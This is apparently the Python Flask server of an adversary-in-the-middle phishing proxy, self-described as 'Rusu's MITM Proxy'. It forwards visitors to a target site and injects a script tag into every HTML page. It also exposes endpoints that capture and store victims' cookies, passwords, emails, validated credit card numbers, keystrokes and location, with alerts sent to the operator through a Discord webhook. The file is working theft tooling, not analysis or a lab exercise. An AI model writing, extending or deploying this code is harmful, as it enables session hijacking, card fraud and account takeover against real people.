from flask import Flask, request, Response, send_from_directory, jsonify
import requests, re, json, os
from datetime import datetime
import brotli
from core.database import Database
from core.detection import DataDetector
from core.discord_bot import DiscordBot
from core.ssl_handler import SSLHandler

# Initialize components
db = Database()
detector = DataDetector()
ssl_handler = SSLHandler()

# Initialize storage and configs
if not os.path.exists('config'):
    os.makedirs('config')

config_file = 'config/settings.json'
if not os.path.exists(config_file):
    with open(config_file, 'w') as f:
        json.dump({
            'discord_webhook': '',
            'cleanup_days': 30,
            'max_history': 50
        }, f)

with open(config_file, 'r') as f:
    config = json.load(f)

discord_bot = DiscordBot(config.get('discord_webhook', ''))
requests_history = []
MAX_HISTORY = config.get('max_history', 50)

def start_proxy(target, host, port, secret):
    app = Flask(__name__)

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route('/ep/api/ping', methods=['POST'])
    def eat_cookie():
        data = request.json
        user_ip = request.remote_addr
        
        for cookie in data.get('cookies', []):
            db.save_cookie(cookie['name'], cookie['value'], user_ip, data.get('url', ''))
            if discord_bot.webhook_url:
                discord_bot.send_cookie_alert({
                    'name': cookie['name'],
                    'value': cookie['value'],
                    'ip': user_ip,
                    'url': data.get('url', '')
                })
        
        return jsonify({'status': 'success'}), 200

    @app.route('/ep/api/sensitive', methods=['POST'])
    def handle_sensitive():
        data = request.json
        user_ip = request.remote_addr
        
        # Validate data using detector
        if data['type'] == 'credit_card' and detector.is_valid_card(data['value']):
            db.save_sensitive_data('credit_card', data['value'], data['url'], user_ip)
            if discord_bot.webhook_url:
                discord_bot.send_sensitive_data_alert({
                    'type': 'Credit Card',
                    'url': data['url'],
                    'ip': user_ip
                })
        elif data['type'] in ['password', 'email']:
            db.save_sensitive_data(data['type'], data['value'], data['url'], user_ip)
            if discord_bot.webhook_url:
                discord_bot.send_sensitive_data_alert({
                    'type': data['type'].capitalize(),
                    'url': data['url'],
                    'ip': user_ip
                })
                
        return jsonify({'status': 'success'}), 200

    @app.route('/ep/api/geolocation', methods=['POST'])
    def handle_geolocation():
        data = request.json
        user_ip = request.remote_addr
        geo_data = detector.get_geolocation(user_ip)
        
        if geo_data:
            db.save_geolocation(
                user_ip,
                data.get('lat'),
                data.get('lon'),
                geo_data.get('country'),
                geo_data.get('city')
            )
            
        return jsonify({'status': 'success'}), 200

    @app.route('/ep/api/settings', methods=['GET', 'POST'])
    def handle_settings():
        if request.method == 'POST':
            data = request.json
            config.update(data)
            with open(config_file, 'w') as f:
                json.dump(config, f)
            
            if 'discord_webhook' in data:
                discord_bot.webhook_url = data['discord_webhook']
            
            return jsonify({'status': 'success'}), 200
        else:
            return jsonify(config), 200

    @app.route('/ep/api/test_discord', methods=['POST'])
    def test_discord():
        if discord_bot.webhook_url:
            success = discord_bot.send_webhook({
                "content": "🔔 Test notification from Rusu's MITM Proxy"
            })
            return jsonify({'status': 'success' if success else 'error'}), 200
        return jsonify({'status': 'error', 'message': 'No webhook URL configured'}), 400

    @app.route('/ep/api/cleanup', methods=['POST'])
    def cleanup_data():
        days = request.json.get('days', 30)
        db.cleanup_old_data(days)
        return jsonify({'status': 'success'}), 200

    @app.route('/ep/api/getCookies', methods=['GET'])
    def get_cookies():
        with open('cookies.json', 'r') as f:
            cookies = json.load(f)

        response_data = []
        for cookie in cookies:
            logged_time = datetime.fromisoformat(cookie['timestamp'])
            time_diff = datetime.now() - logged_time
            seconds_ago = time_diff.total_seconds()
            
            if seconds_ago < 60:
                time_str = f'Logged: {int(seconds_ago)} seconds ago'
            elif seconds_ago < 3600:
                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
            else:
                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'

            response_data.append({
                'name': cookie['name'],
                'value': cookie['value'],
                'timestamp': time_str,
                'ip': cookie.get('ip', 'unknown')
            })

        return jsonify(response_data), 200

    @app.route('/ep/api/serverInfo', methods=['GET'])
    def get_server_info():
        return jsonify({
            'target': target,
            'host': host,
            'port': str(port)
        }), 200

    @app.route('/ep/api/requests', methods=['GET'])
    def get_requests():
        return jsonify(requests_history[-MAX_HISTORY:])

    @app.route('/ep/api/clearCookies', methods=['POST'])
    def clear_cookies():
        with open('cookies.json', 'w') as f:
            json.dump([], f)
        return jsonify({'status': 'success'})

    @app.route('/ep/api/clearHistory', methods=['POST'])
    def clear_history():
        global requests_history
        requests_history = []
        return jsonify({'status': 'success'})

    @app.route('/ep/api/keylog', methods=['POST'])
    def save_keylog():
        data = request.json
        timestamp = datetime.now().isoformat()
        
        log_entry = {
            'keys': data['keys'],
            'url': data['url'],
            'timestamp': timestamp,
            'ip': request.remote_addr
        }
        
        with open('keylogs.json', 'r') as f:
            logs = json.load(f)
            
        logs.append(log_entry)
        
        with open('keylogs.json', 'w') as f:
            json.dump(logs, f)
            
        return jsonify({'status': 'success'})

    @app.route('/ep/api/getKeylog', methods=['GET'])
    def get_keylog():
        with open('keylogs.json', 'r') as f:
            logs = json.load(f)
        return jsonify(logs)

    @app.route('/ep/api/clearKeylog', methods=['POST'])
    def clear_keylog():
        with open('keylogs.json', 'w') as f:
            json.dump([], f)
        return jsonify({'status': 'success'})

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    def proxy(path):
        target_url = f"https://{target}/{path}"
        headers = {key: value for key, value in request.headers if key.lower() != 'host'}
        headers['Host'] = target

        try:
            resp = requests.request(
                method=request.method,
                url=target_url,
                headers=headers,
                params=request.args,
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=False,
                verify=False
            )

            # Log request
            request_log = {
                'timestamp': datetime.now().isoformat(),
                'method': request.method,
                'path': path,
                'status_code': resp.status_code,
                'ip': request.remote_addr
            }
            requests_history.append(request_log)
            if len(requests_history) > MAX_HISTORY:
                requests_history.pop(0)

            # Process response
            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
            headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]

            # Inject payload if HTML
            response = resp.content
            if 'text/html' in resp.headers.get('Content-Type', ''):
                response = response.decode('utf-8')
                response = response.replace('</head>', '<script src="/payload-script.js"></script></head>')
                response = response.encode('utf-8')

            return Response(response, resp.status_code, headers)

        except Exception as e:
            return f"Error: {str(e)}", 500

    ssl_context = None  # Remove SSL for now to get basic functionality working
    app.run(host=host, port=port)